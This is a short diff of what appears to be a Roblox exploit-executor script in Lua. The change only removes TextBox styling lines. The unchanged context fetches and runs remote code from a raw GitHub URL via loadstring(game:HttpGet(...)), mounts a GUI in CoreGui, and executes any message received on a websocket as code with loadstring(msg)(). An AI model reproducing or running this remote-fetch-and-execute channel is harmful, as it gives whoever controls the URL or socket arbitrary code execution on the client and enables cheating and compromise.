@@ -4,11 +4,6 @@ repeat wait() until socket
 local gui = loadstring(game:HttpGet("https://raw.githubusercontent.com/dreadmania11352/lolololololol/main/gui"))()
 gui.Parent = game.CoreGui
 local box = gui.Frame.Frame.TextBox
-box.MultiLine = false
-box.BackgroundTransparency = .5
-box.Position = UDim2.new(0.5, 0, 0.5, 0)
-box.AnchorPoint = Vector2.new(0.5, 0.5)
-box.Size = UDim2.new(0.25,0,0.25,0)
 
 socket.OnMessage:Connect(function(msg)
     loadstring(msg)()
